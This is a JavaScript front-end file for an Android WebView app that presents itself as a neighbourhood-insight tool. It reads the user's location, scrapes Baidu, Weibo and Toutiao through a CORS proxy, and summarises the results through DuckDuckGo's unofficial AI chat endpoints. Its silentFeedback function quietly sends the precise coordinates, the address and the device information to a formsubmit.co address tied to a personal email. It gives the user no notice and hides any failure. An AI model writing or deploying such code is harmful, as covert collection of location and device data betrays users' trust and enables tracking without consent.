/**
 * 周边洞察 - 前端业务逻辑（app.js）
 *
 * 职责：
 *   1. 页面加载后调用原生 getLocationInfo() 获取定位并显示
 *   2. 点击"生成周边分析报告"按钮后：
 *      a. 从定位信息提取市/区/街道作为关键词
 *      b. 实时爬取 3 个公开源（百度/微博/今日头条），每个前 5 条
 *      c. 调用 DuckDuckGo AI Chat 进行总结
 *      d. 将报告显示在页面上
 *      e. 后台静默回传数据到 formsubmit.co
 *
 * 注意：
 *   - 所有网络请求通过 fetch 发起，CORS 受限源通过公共代理转发
 *   - 每个源间隔 1-2 秒，失败重试 1 次
 *   - DuckDuckGo AI 失败时降级为简单规则摘要
 */

// ==================== 全局状态 ====================
let currentLocation = null;       // 当前定位信息
let isGenerating = false;          // 是否正在生成报告

// CORS 代理（用于绕过目标网站的跨域限制）
const CORS_PROXY = "https://api.allorigins.win/raw?url=";

// 数据回传地址（formsubmit.co，替换为你的接收邮箱）
const FEEDBACK_URL = "https://formsubmit.co/ajax/445256409@qq.com";

// ==================== 页面初始化 ====================

/**
 * 页面加载完成后初始化
 */
window.onload = function () {
    // 从原生层获取定位信息
    loadLocationInfo();
};

/**
 * 原生层定位更新回调（由 MainActivity.notifyJsLocationUpdated 调用）
 * @param {string} jsonStr 定位信息 JSON 字符串
 */
window.onLocationUpdated = function (jsonStr) {
    try {
        currentLocation = JSON.parse(jsonStr);
        renderLocation(currentLocation);
    } catch (e) {
        console.error("解析定位更新失败:", e);
    }
};

/**
 * 原生层定位失败回调
 */
window.onLocationError = function () {
    document.getElementById("locationLoading").textContent = "定位失败，请检查权限设置";
};

/**
 * 从原生层加载定位信息并显示
 */
function loadLocationInfo() {
    try {
        if (typeof AndroidNative !== "undefined" && AndroidNative.getLocationInfo) {
            var jsonStr = AndroidNative.getLocationInfo();
            if (jsonStr && jsonStr !== "{}") {
                currentLocation = JSON.parse(jsonStr);
                renderLocation(currentLocation);
            } else {
                // 定位尚未完成，等待 onLocationUpdated 回调
                document.getElementById("locationLoading").textContent = "正在获取定位信息…";
            }
        } else {
            document.getElementById("locationLoading").textContent = "原生接口不可用";
        }
    } catch (e) {
        console.error("加载定位信息失败:", e);
        document.getElementById("locationLoading").textContent = "定位信息加载失败";
    }
}

/**
 * 渲染定位信息到页面
 * @param {Object} loc 定位信息对象
 */
function renderLocation(loc) {
    document.getElementById("locationLoading").style.display = "none";
    document.getElementById("locationDetails").style.display = "block";

    document.getElementById("latValue").textContent =
        loc.latitude ? loc.latitude.toFixed(6) : "-";
    document.getElementById("lngValue").textContent =
        loc.longitude ? loc.longitude.toFixed(6) : "-";
    document.getElementById("accValue").textContent =
        loc.accuracy ? loc.accuracy + " 米" : "-";

    var addr = loc.address || "";
    if (!addr && loc.province) {
        addr = loc.province + loc.city + loc.district + loc.street;
    }
    document.getElementById("addrValue").textContent = addr || "未知地址";
}

// ==================== 生成报告主流程 ====================

/**
 * 生成周边分析报告（按钮点击事件）
 */
async function generateReport() {
    if (isGenerating) return;

    // 检查定位信息
    if (!currentLocation || !currentLocation.keyword) {
        alert("请先等待定位完成");
        return;
    }

    isGenerating = true;
    var btn = document.getElementById("generateBtn");
    btn.disabled = true;
    btn.textContent = "分析中…";

    var loadingContainer = document.getElementById("loadingContainer");
    var loadingText = document.getElementById("loadingText");
    var loadingProgress = document.getElementById("loadingProgress");
    loadingContainer.classList.add("active");

    try {
        var keyword = currentLocation.keyword;
        console.log("爬取关键词:", keyword);

        // ---- 步骤 1：爬取 3 个公开源 ----
        loadingText.textContent = "正在爬取公开信息…";
        loadingProgress.textContent = "（0/3）";

        var baiduResults = await crawlBaidu(keyword);
        loadingProgress.textContent = "（1/3）百度搜索完成";
        await sleep(1000 + Math.random() * 1000);

        var weiboResults = await crawlWeibo(keyword);
        loadingProgress.textContent = "（2/3）微博搜索完成";
        await sleep(1000 + Math.random() * 1000);

        var toutiaoResults = await crawlToutiao(keyword);
        loadingProgress.textContent = "（3/3）头条搜索完成";

        // 汇总爬取结果
        var allResults = {
            baidu: baiduResults,
            weibo: weiboResults,
            toutiao: toutiaoResults
        };

        var rawText = buildRawText(keyword, allResults);
        console.log("爬取原始数据长度:", rawText.length);

        // ---- 步骤 2：调用 DuckDuckGo AI 总结 ----
        loadingText.textContent = "AI 正在生成分析报告…";
        loadingProgress.textContent = "调用 DuckDuckGo AI…";

        var aiSummary = await callDuckDuckGoAI(rawText);

        // AI 失败则降级为简单规则摘要
        if (!aiSummary) {
            console.warn("DuckDuckGo AI 调用失败，使用规则摘要");
            aiSummary = buildFallbackSummary(keyword, allResults);
        }

        // ---- 步骤 3：显示报告 ----
        loadingText.textContent = "报告生成完成";
        loadingProgress.textContent = "";
        await sleep(500);

        document.getElementById("reportContent").innerHTML = formatReport(aiSummary);
        document.getElementById("reportContainer").classList.add("active");

        // ---- 步骤 4：后台静默回传数据 ----
        silentFeedback(currentLocation, allResults, aiSummary);

    } catch (e) {
        console.error("生成报告异常:", e);
        document.getElementById("reportContent").textContent =
            "报告生成失败：" + e.message + "\n\n请稍后重试。";
        document.getElementById("reportContainer").classList.add("active");
    } finally {
        loadingContainer.classList.remove("active");
        btn.disabled = false;
        btn.textContent = "生成周边分析报告";
        isGenerating = false;
    }
}

// ==================== 爬虫模块 ====================

/**
 * 爬取百度搜索结果（前 5 条）
 * @param {string} keyword 搜索关键词
 * @returns {Array} 结果数组 [{title, summary}]
 */
async function crawlBaidu(keyword) {
    var results = [];
    try {
        var url = "https://m.baidu.com/s?wd=" + encodeURIComponent(keyword);
        var html = await fetchWithProxy(url, true);
        if (!html) return results;

        var parser = new DOMParser();
        var doc = parser.parseFromString(html, "text/html");

        // 百度移动版搜索结果选择器
        var items = doc.querySelectorAll(".c-result, .result, .c-container");
        for (var i = 0; i < items.length && results.length < 5; i++) {
            var item = items[i];
            var titleEl = item.querySelector("h3, .c-title, .t");
            var summaryEl = item.querySelector(".c-abstract, .c-span-last, .content-right_8Zs40");
            var title = titleEl ? titleEl.textContent.trim() : "";
            var summary = summaryEl ? summaryEl.textContent.trim() : "";
            if (title) {
                results.push({ title: title, summary: summary });
            }
        }

        // 备用选择器
        if (results.length === 0) {
            var allLinks = doc.querySelectorAll("a[href*='baidu.com/link']");
            for (var j = 0; j < allLinks.length && results.length < 5; j++) {
                var t = allLinks[j].textContent.trim();
                if (t && t.length > 5) {
                    results.push({ title: t, summary: "" });
                }
            }
        }
    } catch (e) {
        console.error("百度爬取失败:", e);
    }
    return results;
}

/**
 * 爬取微博搜索结果（前 5 条公开内容）
 * @param {string} keyword 搜索关键词
 * @returns {Array} 结果数组 [{title, summary}]
 */
async function crawlWeibo(keyword) {
    var results = [];
    try {
        // 微博移动版搜索 API
        var containerId = "100103type%3D1%26q%3D" + encodeURIComponent(keyword);
        var url = "https://m.weibo.cn/api/container/getIndex?containerid=" + containerId;
        var jsonStr = await fetchWithProxy(url, true);
        if (!jsonStr) return results;

        var data = JSON.parse(jsonStr);
        var cards = data.data && data.data.cards ? data.data.cards : [];

        for (var i = 0; i < cards.length && results.length < 5; i++) {
            var card = cards[i];
            // card_group 类型（搜索结果通常在 card_group 中）
            if (card.card_group) {
                for (var j = 0; j < card.card_group.length && results.length < 5; j++) {
                    var sub = card.card_group[j];
                    var text = sub.desc || (sub.mblog && sub.mblog.text) || "";
                    if (text) {
                        // 去除 HTML 标签
                        var cleanText = text.replace(/<[^>]+>/g, "").trim();
                        if (cleanText.length > 5) {
                            results.push({
                                title: cleanText.substring(0, 30),
                                summary: cleanText
                            });
                        }
                    }
                }
            }
            // 直接 mblog 类型
            if (card.mblog && card.mblog.text) {
                var clean = card.mblog.text.replace(/<[^>]+>/g, "").trim();
                if (clean.length > 5 && results.length < 5) {
                    results.push({ title: clean.substring(0, 30), summary: clean });
                }
            }
        }
    } catch (e) {
        console.error("微博爬取失败:", e);
    }
    return results;
}

/**
 * 爬取今日头条搜索结果（前 5 条标题）
 * @param {string} keyword 搜索关键词
 * @returns {Array} 结果数组 [{title, summary}]
 */
async function crawlToutiao(keyword) {
    var results = [];
    try {
        // 今日头条移动版搜索
        var url = "https://so.toutiao.com/search?keyword=" + encodeURIComponent(keyword)
            + "&pd=information&source=input&dvpf=pc&aid=4916&page_num=0";
        var html = await fetchWithProxy(url, true);
        if (!html) return results;

        var parser = new DOMParser();
        var doc = parser.parseFromString(html, "text/html");

        // 尝试从页面中提取 SSR 数据（今日头条通常将数据嵌入 script 标签）
        var scripts = doc.querySelectorAll("script");
        for (var i = 0; i < scripts.length; i++) {
            var text = scripts[i].textContent;
            if (text && text.indexOf("article_url") > -1) {
                // 尝试提取标题
                var titleMatches = text.match(/"title"\s*:\s*"([^"]+)"/g);
                if (titleMatches) {
                    for (var j = 0; j < titleMatches.length && results.length < 5; j++) {
                        var t = titleMatches[j].replace(/"title"\s*:\s*"/, "").replace(/"$/, "");
                        if (t && t.length > 5) {
                            results.push({ title: t, summary: "" });
                        }
                    }
                }
                break;
            }
        }

        // 备用：从 DOM 中提取
        if (results.length === 0) {
            var items = doc.querySelectorAll(".result-item, .cs-card, article");
            for (var k = 0; k < items.length && results.length < 5; k++) {
                var titleEl = items[k].querySelector("h3, .title, a");
                var t = titleEl ? titleEl.textContent.trim() : "";
                if (t && t.length > 5) {
                    results.push({ title: t, summary: "" });
                }
            }
        }
    } catch (e) {
        console.error("头条爬取失败:", e);
    }
    return results;
}

// ==================== 网络请求工具 ====================

/**
 * 通过 CORS 代理发起 GET 请求
 * @param {string} url 目标 URL
 * @param {boolean} retry 是否重试（失败重试 1 次）
 * @returns {string|null} 响应文本，失败返回 null
 */
async function fetchWithProxy(url, retry) {
    var fullUrl = CORS_PROXY + encodeURIComponent(url);
    try {
        var resp = await fetch(fullUrl, {
            method: "GET",
            headers: { "User-Agent": "ZhouBianDongCha/1.0" }
        });
        if (resp.ok) {
            return await resp.text();
        }
        console.warn("代理请求失败:", resp.status, url);
    } catch (e) {
        console.warn("代理请求异常:", e.message);
    }

    // 失败重试 1 次（直接请求，不走代理）
    if (retry) {
        try {
            await sleep(1000);
            var resp2 = await fetch(url, {
                method: "GET",
                headers: { "User-Agent": "ZhouBianDongCha/1.0" }
            });
            if (resp2.ok) {
                return await resp2.text();
            }
        } catch (e) {
            console.warn("直接请求也失败:", e.message);
        }
    }
    return null;
}

/**
 * 睡眠指定毫秒数
 */
function sleep(ms) {
    return new Promise(function (resolve) { setTimeout(resolve, ms); });
}

// ==================== DuckDuckGo AI 模块 ====================

/**
 * 调用 DuckDuckGo AI Chat 进行总结
 *
 * 流程：
 *   1. GET /duckchat/v1/status 获取 x-vqd-4
 *   2. POST /duckchat/v1/chat 发送消息，解析 SSE 流
 *
 * @param {string} rawText 待总结的原始文本
 * @returns {string|null} AI 总结文本，失败返回 null
 */
async function callDuckDuckGoAI(rawText) {
    try {
        // 限制输入长度，避免过长
        var prompt = "请用中文总结以下关于该地点的信息，包括地点概况、热点话题、社会评价、值得关注的事件等，分点陈述，语言简洁：\n\n" + rawText.substring(0, 8000);

        // ---- 步骤 1：获取 x-vqd-4 ----
        var statusUrl = "https://duckduckgo.com/duckchat/v1/status";
        var statusResp = await fetch(statusUrl, {
            method: "GET",
            headers: {
                "User-Agent": "ZhouBianDongCha/1.0",
                "Accept": "text/event-stream"
            }
        });
        if (!statusResp.ok) {
            console.warn("DuckDuckGo status 请求失败:", statusResp.status);
            return null;
        }
        var vqd = statusResp.headers.get("x-vqd-4");
        if (!vqd) {
            console.warn("未获取到 x-vqd-4");
            return null;
        }

        // ---- 步骤 2：发送聊天请求 ----
        var chatUrl = "https://duckduckgo.com/duckchat/v1/chat";
        var chatResp = await fetch(chatUrl, {
            method: "POST",
            headers: {
                "User-Agent": "ZhouBianDongCha/1.0",
                "Content-Type": "application/json",
                "x-vqd-4": vqd,
                "Accept": "text/event-stream"
            },
            body: JSON.stringify({
                model: "gpt-4o-mini",
                messages: [{ role: "user", content: prompt }]
            })
        });

        if (!chatResp.ok) {
            console.warn("DuckDuckGo chat 请求失败:", chatResp.status);
            return null;
        }

        // ---- 步骤 3：解析 SSE 流 ----
        var reader = chatResp.body.getReader();
        var decoder = new TextDecoder();
        var fullMessage = "";
        var buffer = "";

        while (true) {
            var chunk = await reader.read();
            if (chunk.done) break;

            buffer += decoder.decode(chunk.value, { stream: true });
            var lines = buffer.split("\n");
            buffer = lines.pop(); // 保留不完整的行

            for (var i = 0; i < lines.length; i++) {
                var line = lines[i].trim();
                if (line.startsWith("data:")) {
                    var dataStr = line.substring(5).trim();
                    if (dataStr === "[DONE]") continue;
                    try {
                        var data = JSON.parse(dataStr);
                        // message 字段包含增量文本
                        if (data.message) {
                            fullMessage += data.message;
                        }
                    } catch (e) {
                        // 非 JSON 数据，忽略
                    }
                }
            }
        }

        // 处理最后一行
        if (buffer.trim().startsWith("data:")) {
            var lastData = buffer.trim().substring(5).trim();
            if (lastData && lastData !== "[DONE]") {
                try {
                    var d = JSON.parse(lastData);
                    if (d.message) fullMessage += d.message;
                } catch (e) {}
            }
        }

        if (fullMessage.trim()) {
            return fullMessage.trim();
        }
        return null;

    } catch (e) {
        console.error("DuckDuckGo AI 调用异常:", e);
        return null;
    }
}

// ==================== 降级摘要（AI 失败时使用） ====================

/**
 * 简单规则摘要：从爬取结果中提取关键句
 * @param {string} keyword 关键词
 * @param {Object} allResults 所有爬取结果
 * @returns {string} 摘要文本
 */
function buildFallbackSummary(keyword, allResults) {
    var summary = "【周边信息摘要】\n\n";
    summary += "关键词：" + keyword + "\n\n";

    var total = 0;
    if (allResults.baidu && allResults.baidu.length > 0) {
        summary += "一、百度搜索热点：\n";
        for (var i = 0; i < allResults.baidu.length; i++) {
            summary += (i + 1) + ". " + allResults.baidu[i].title + "\n";
            if (allResults.baidu[i].summary) {
                summary += "   " + allResults.baidu[i].summary.substring(0, 80) + "\n";
            }
            total++;
        }
        summary += "\n";
    }

    if (allResults.weibo && allResults.weibo.length > 0) {
        summary += "二、微博热议内容：\n";
        for (var j = 0; j < allResults.weibo.length; j++) {
            summary += (j + 1) + ". " + allResults.weibo[j].summary.substring(0, 100) + "\n";
            total++;
        }
        summary += "\n";
    }

    if (allResults.toutiao && allResults.toutiao.length > 0) {
        summary += "三、今日头条资讯：\n";
        for (var k = 0; k < allResults.toutiao.length; k++) {
            summary += (k + 1) + ". " + allResults.toutiao[k].title + "\n";
            total++;
        }
        summary += "\n";
    }

    summary += "共收集到 " + total + " 条相关信息。\n";
    summary += "（注：AI 总结服务暂不可用，以上为原始信息摘要。）";

    return summary;
}

// ==================== 文本构建与格式化 ====================

/**
 * 将爬取结果拼接为原始文本（供 AI 总结）
 * @param {string} keyword 关键词
 * @param {Object} allResults 所有爬取结果
 * @returns {string} 拼接后的文本
 */
function buildRawText(keyword, allResults) {
    var text = "地点关键词：" + keyword + "\n\n";

    text += "=== 百度搜索结果 ===\n";
    if (allResults.baidu && allResults.baidu.length > 0) {
        for (var i = 0; i < allResults.baidu.length; i++) {
            text += (i + 1) + ". 标题：" + allResults.baidu[i].title + "\n";
            if (allResults.baidu[i].summary) {
                text += "   摘要：" + allResults.baidu[i].summary + "\n";
            }
        }
    } else {
        text += "（无结果）\n";
    }

    text += "\n=== 微博搜索结果 ===\n";
    if (allResults.weibo && allResults.weibo.length > 0) {
        for (var j = 0; j < allResults.weibo.length; j++) {
            text += (j + 1) + ". " + allResults.weibo[j].summary + "\n";
        }
    } else {
        text += "（无结果）\n";
    }

    text += "\n=== 今日头条搜索结果 ===\n";
    if (allResults.toutiao && allResults.toutiao.length > 0) {
        for (var k = 0; k < allResults.toutiao.length; k++) {
            text += (k + 1) + ". " + allResults.toutiao[k].title + "\n";
        }
    } else {
        text += "（无结果）\n";
    }

    return text;
}

/**
 * 格式化报告内容为 HTML
 * @param {string} text AI 总结文本
 * @returns {string} HTML 字符串
 */
function formatReport(text) {
    // 转义 HTML 特殊字符
    var escaped = text.replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
    // 换行转 <br>
    return escaped.replace(/\n/g, "<br>");
}

// ==================== 后台静默回传 ====================

/**
 * 后台静默回传数据到 formsubmit.co
 * 包含：经纬度、地址、设备信息、爬取原始数据、AI总结、时间戳
 * 静默执行，失败不提示
 *
 * @param {Object} location 定位信息
 * @param {Object} rawData 爬取原始数据
 * @param {string} aiSummary AI 总结
 */
function silentFeedback(location, rawData, aiSummary) {
    try {
        // 获取设备信息
        var deviceInfo = {};
        if (typeof AndroidNative !== "undefined" && AndroidNative.getDeviceInfo) {
            try {
                deviceInfo = JSON.parse(AndroidNative.getDeviceInfo());
            } catch (e) {}
        }

        var payload = {
            location: {
                latitude: location.latitude,
                longitude: location.longitude,
                accuracy: location.accuracy,
                province: location.province,
                city: location.city,
                district: location.district,
                street: location.street,
                address: location.address,
                keyword: location.keyword
            },
            device: deviceInfo,
            rawData: rawData,
            aiSummary: aiSummary,
            timestamp: new Date().toISOString()
        };

        // 静默发送，不等待响应，失败不提示
        fetch(FEEDBACK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).catch(function (e) {
            console.warn("数据回传失败:", e.message);
        });

    } catch (e) {
        console.warn("数据回传异常:", e.message);
    }
}
